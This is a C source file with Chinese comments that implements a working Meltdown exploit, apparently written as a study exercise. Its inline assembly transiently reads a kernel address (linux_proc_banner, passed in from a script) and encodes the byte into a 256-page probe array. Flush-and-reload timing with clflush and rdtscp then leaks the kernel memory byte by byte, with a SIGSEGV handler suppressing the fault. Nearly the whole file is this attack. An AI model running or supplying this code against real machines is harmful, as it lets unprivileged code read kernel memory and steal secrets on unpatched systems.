#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h> 
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#define pagesize 4096
#define try if(!sigsetjmp(Jump_Buffer,1))  
#define catch else  
#define throw siglongjmp(Jump_Buffer,1)  
jmp_buf Jump_Buffer;
static char volatile test[256*pagesize]={};
static void SegErrCatch(int sig){
    throw;
}
static inline void memoryaccess(void *p) {
  asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");//读取该字节
}
int gettime(volatile char *addr){ //读取一个地址内的字节读出来的时间，以判断是否在cache中
    unsigned long long  time1,time2;
    int tmp=0;
    time1 = __rdtscp(&tmp);//记录一个时间
    memoryaccess(addr);//读取
    time2 = __rdtscp(&tmp);//记录第二个时间，减去第一个时间就是总时间
    return time2-time1;
}
int loadpage(){  //检查test数组里每个位置读取的时间，寻找最小的那个，即可判断攻击地址的值
    unsigned int volatile pagenum,ans,min=0xffffffff,time;
    for (int i=0;i<256;i++){
        pagenum=((i * 167) + 13) & 255;
		//一个数字游戏，取值结果为 0 - 255 随机数且不重复，执行顺序轻微混淆可以防止stride prediction（某种分支预测方法）
        time=gettime(test+pagesize*pagenum);
        if (min>time){
            min=time;
            ans=pagenum;
        }
    }
    return ans;   
}
int attack(char* addr)
{	
	//核心代码，是一段内联汇编
	try{
	asm volatile (//volatile让编译器不会优化这段代码
    /*作用是进行一定的延时保证变量进入cache*/
		".rept 100\n\t"
		"add $0x100, %%rax\n\t"
		".endr\n\t"
    /*
    试探读取字符，当然在movzx这里本应该失败，但是预读取会使这三条指令都会执行。
    第一行读取被攻击的地址的内容;
    第二行是将读取值乘上pagesize，即左移12位;
    第三行尝试读取test数组的一页，页码是最初的读取值，CPU会将这一页放入cache。
    */
		"movzx (%[addr]), %%rax\n\t"
        "shl $12, %%rax\n\t"
        "mov (%[target], %%rax, 1), %%rbx\n"
		:
		: [target] "r" (test),
		  [addr] "r" (addr)
		: "rax","rbx"
	);	
	}
	catch{
		return 0;
	}
}
void readbyte(int fd,char *addr){//运用meltdown原理读取指定地址addr内一个字节的内容
    static char buf[256];
    memset(test,0xff, sizeof(test));
    pread(fd, buf, sizeof(buf), 0);   
    for (int i=0;i<256;i++){
        _mm_clflush(test+i*pagesize);
    }//清空test数组，使其全部不在cache中
    if (attack(addr)!=0) {
		puts("攻击失败");
		exit(0);
	}
    return;
}
int main(int argc, const char* * argv){      
    int p[256];//存储各页的分数
    char* addr;
    char content[100];
    int tmp,len,max1,max2;
    int fd = open("/proc/version", O_RDONLY);//打开一个文件，暂时不知道有什么作用，参考的是proc里的代码。如果没有会失败。猜测和数组存入cache有关
	signal(SIGSEGV,SegErrCatch);//注册SIGSEGV信号的处理函数   
	sscanf(argv[1],"%lx",&addr);//melt.sh传来了linux_proc_banner的地址
    sscanf(argv[2],"%d",&len);//读取指定数量的字节
    printf("读取该地址%lx后%d字节的内容：\n",addr,len);
    for (int j=0;j<len;j++){
        memset(p,0,sizeof(p));
		max1=max2=0;
		while (p[max1]<=2*p[max2]+20){
		/*采用动态次数猜测方法。只有当最高页分数大于次高页分数的两倍加20分时，才确信最高页的页码是我们想要窃取的值。*/
			readbyte(fd,addr);
			tmp=loadpage();
            p[tmp]++;//被猜测的页的分数加1
			if (tmp!=max1){
				if (p[tmp]>p[max1]) {
					max2=max1;
					max1=tmp;	
				}
				else if (p[tmp]>p[max2]) {
					max2=tmp;
				}
			}//修改最高和次高页的页码			
        }
		tmp=0;
		for (int i=0;i<256;i++){
			if (p[i]>p[tmp]) tmp=i;
		}
        printf("第%d个字节为%c\n",j,tmp);  
        content[j]=tmp;
        addr++;      
    }
	content[len]='\0';
    printf("读取的完整内容为:\n%s\n",content);
}
